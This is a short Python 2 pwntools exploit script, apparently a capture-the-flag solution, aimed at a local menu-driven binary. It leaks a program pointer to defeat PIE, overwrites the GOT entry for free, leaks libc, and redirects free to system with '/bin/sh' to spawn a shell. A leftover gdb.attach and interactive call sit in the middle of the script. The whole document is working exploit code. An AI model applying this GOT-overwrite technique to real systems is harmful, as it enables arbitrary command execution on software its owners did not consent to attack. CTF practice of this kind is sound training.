from pwn import *

p = process('./a.out')

context.log_level="error"

binary = ELF('./a.out')
libc = ELF('./libc.so.6')

def send(b):
    p.sendlineafter(': ',str(b))
def send2(b):
    p.sendafter('name:',str(b))

send(2)
send2('a'*15)
send(7)
send(1)
send(5)
p.readuntil('name is ')
t = int(p.readuntil('\n')[:-1][::-1].encode('hex'),16)
print hex(t)

base = t - binary.symbols['getFlag']
print "base",hex(base)

send('6')
gdb.attach(p)
p.interactive()

send('4')
send2(p64(base+binary.symbols['got.free']))

send(1)
send(6)
send('2')
send2('/bin/sh')

send('2')
send2('\x50')

send(5)
p.readuntil('name is ')
t = int(p.readuntil('\n')[:-1][::-1].encode('hex'),16)
print hex(t)

base = t-libc.symbols['free']
print "base",hex(base)

send(4)
send2(p64(base+libc.symbols['system']))

p.interactive()

